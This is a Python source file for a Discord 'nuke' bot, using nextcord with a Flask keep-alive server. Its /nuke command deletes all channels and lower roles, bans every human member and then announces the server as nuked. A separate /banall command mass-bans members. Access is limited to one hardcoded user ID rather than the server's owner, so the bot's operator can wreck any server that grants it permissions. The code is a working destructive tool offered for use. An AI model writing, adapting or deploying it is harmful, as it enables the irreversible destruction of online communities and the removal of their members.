import os
import threading
import asyncio
import nextcord
from nextcord.ext import commands
from nextcord import Interaction
from nextcord.ui import View
from flask import Flask

# ----------------------
# CONFIG
# ----------------------
AUTHORIZED_USERS = {1355140133661184221}
TOKEN = os.environ.get("TOKEN")
PORT = int(os.environ.get("PORT", 10000))

if not TOKEN:
    raise RuntimeError("Missing TOKEN environment variable")

# ----------------------
# FLASK KEEP-ALIVE
# ----------------------
app = Flask("")

@app.route("/")
def home():
    return "Bot is running!"

def run_flask():
    app.run(host="0.0.0.0", port=PORT)

threading.Thread(target=run_flask, daemon=True).start()

# ----------------------
# BOT SETUP
# ----------------------
intents = nextcord.Intents.default()
intents.members = True
intents.guilds = True

bot = commands.Bot(command_prefix="!", intents=intents)

@bot.event
async def on_ready():
    print(f"✅ Logged in as {bot.user}")
    try:
        synced = await bot.sync_application_commands()
        print(f"✅ Synced {len(synced)} slash commands")
    except Exception as e:
        print("❌ Sync error:", e)

# ----------------------
# CONFIRM NUKE VIEW (FIXED)
# ----------------------
class ConfirmNuke(View):
    def __init__(self, user_id):
        super().__init__(timeout=30)
        self.user_id = user_id
        self.confirmed = False

    async def interaction_check(self, interaction: Interaction):
        if interaction.user.id != self.user_id:
            await interaction.response.send_message(
                "❌ You cannot use these buttons.",
                ephemeral=True
            )
            return False
        return True

    @nextcord.ui.button(
        label="CONFIRM NUKE",
        style=nextcord.ButtonStyle.danger
    )
    async def confirm(
        self,
        button: nextcord.ui.Button,
        interaction: Interaction
    ):
        self.confirmed = True
        for child in self.children:
            child.disabled = True
        await interaction.response.edit_message(
            content="💥 **NUKE CONFIRMED — RUNNING...**",
            view=self
        )
        self.stop()

    @nextcord.ui.button(
        label="CANCEL",
        style=nextcord.ButtonStyle.secondary
    )
    async def cancel(
        self,
        button: nextcord.ui.Button,
        interaction: Interaction
    ):
        for child in self.children:
            child.disabled = True
        await interaction.response.edit_message(
            content="❌ Cancelled.",
            view=self
        )
        self.stop()

# ----------------------
# /NUKE COMMAND
# ----------------------
@bot.slash_command(description="Deletes channels, roles and bans members")
async def nuke(interaction: Interaction):

    if interaction.user.id not in AUTHORIZED_USERS:
        await interaction.response.send_message(
            "❌ Not allowed.",
            ephemeral=True
        )
        return

    view = ConfirmNuke(interaction.user.id)
    await interaction.response.send_message(
        "⚠️ **THIS WILL DESTROY THE SERVER**",
        view=view,
        ephemeral=True
    )

    await view.wait()
    if not view.confirmed:
        return

    # IMPORTANT: prevent timeout
    await interaction.followup.defer(ephemeral=True)

    guild = interaction.guild
    bot_member = guild.me

    # DELETE CHANNELS
    for channel in list(guild.channels):
        try:
            await channel.delete(reason="Nuked")
            await asyncio.sleep(0.4)
        except:
            pass

    # DELETE ROLES
    for role in list(guild.roles):
        if role.is_default() or role.managed:
            continue
        if role.position >= bot_member.top_role.position:
            continue
        try:
            await role.delete(reason="Nuked")
            await asyncio.sleep(0.3)
        except:
            pass

    # BAN MEMBERS
    banned = 0
    failed = 0

    for member in list(guild.members):
        if member.bot or member.id in AUTHORIZED_USERS:
            continue
        try:
            await member.ban(reason="Nuked")
            banned += 1
            await asyncio.sleep(1.0)
        except:
            failed += 1

    try:
        ch = await guild.create_text_channel("server-nuked")
        await ch.send(
            f"💥 **Server Nuked**\n"
            f"🔨 Banned: {banned}\n"
            f"⚠️ Failed: {failed}"
        )
    except:
        pass

# ----------------------
# /BANALL COMMAND (FIXED)
# ----------------------
@bot.slash_command(description="Ban all members except authorized users")
async def banall(interaction: Interaction):

    if interaction.user.id not in AUTHORIZED_USERS:
        await interaction.response.send_message(
            "❌ Not allowed.",
            ephemeral=True
        )
        return

    guild = interaction.guild
    if not guild:
        await interaction.response.send_message(
            "❌ Server only.",
            ephemeral=True
        )
        return

    # Prevent timeout
    await interaction.response.defer(ephemeral=True)

    banned = 0
    failed = 0

    for member in list(guild.members):
        if member.bot or member.id in AUTHORIZED_USERS:
            continue
        try:
            await member.ban(reason="Mass ban")
            banned += 1
            await asyncio.sleep(1.0)
        except:
            failed += 1

    await interaction.followup.send(
        f"✅ **Banall Complete**\n"
        f"🔨 Banned: {banned}\n"
        f"⚠️ Failed: {failed}",
        ephemeral=True
    )

# ----------------------
# RUN BOT
# ----------------------
bot.run(TOKEN)
